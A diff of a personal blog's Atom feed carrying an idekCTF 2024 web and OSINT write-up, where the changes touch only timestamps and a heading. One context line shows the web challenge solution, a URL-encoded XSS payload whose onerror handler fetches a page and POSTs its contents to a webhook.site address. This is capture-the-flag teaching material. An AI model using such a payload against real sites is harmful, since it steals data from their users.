@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2024-08-19T22:19:47+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">idekCTF Web and OSINT Writeup</title><link href="https://www.cjxol.com/posts/idekctf-2024-writeup/" rel="alternate" type="text/html" title="idekCTF Web and OSINT Writeup" /><published>2024-08-19T00:00:00+01:00</published><updated>2024-08-19T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/idekctf-2024-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/idekctf-2024-writeup/"><![CDATA[<p>Notes on solving the web challenge and some GeoGuessr-style challenges (had a lot of luck).</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2024-08-19T22:21:39+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">idekCTF Web and OSINT Writeup</title><link href="https://www.cjxol.com/posts/idekctf-2024-writeup/" rel="alternate" type="text/html" title="idekCTF Web and OSINT Writeup" /><published>2024-08-19T00:00:00+01:00</published><updated>2024-08-19T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/idekctf-2024-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/idekctf-2024-writeup/"><![CDATA[<p>Notes on solving the web challenge and some GeoGuessr-style challenges (had a lot of luck).</p>
 
 <h2 id="webhello">web/Hello</h2>
 
@@ -58,7 +58,7 @@
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://idek-hello.chal.idek.team:1337/?name=%3Cimg%0Csrc%3Da%0Conerror%3D%22fetch%28%27%5C%5Cinfo%2Ephp%5C%5Ca%2Ephp%27%29%2Ethen%28r%3D%3Er%2Etext%28%29%29%2Ethen%28r%3D%3Efetch%28%27https%3A%5C%5C%5C%5Cwebhook%2Esite%5C%5C%5BREDACTED%5D%27%2C%7Bmethod%3A%27POST%27%2Cbody%3Ar%7D%29%29%22%3E%0A
 </code></pre></div></div>
 
-<h2 id="miscnmpz-geoguessr-style">misc/NM<del>PZ</del>~ (GeoGuessr-style)</h2>
+<h2 id="miscnmpz-geoguessr-style">misc/NM<del>PZ</del> (GeoGuessr-style)</h2>
 
 <p>This is some notes on my process of solving some of the challenges with the team (also with a lot of luck involved). It may contain some errors due to limited knowledge on different locations, and just write about observations and knowledge gathered during solving the challenge.</p>
 
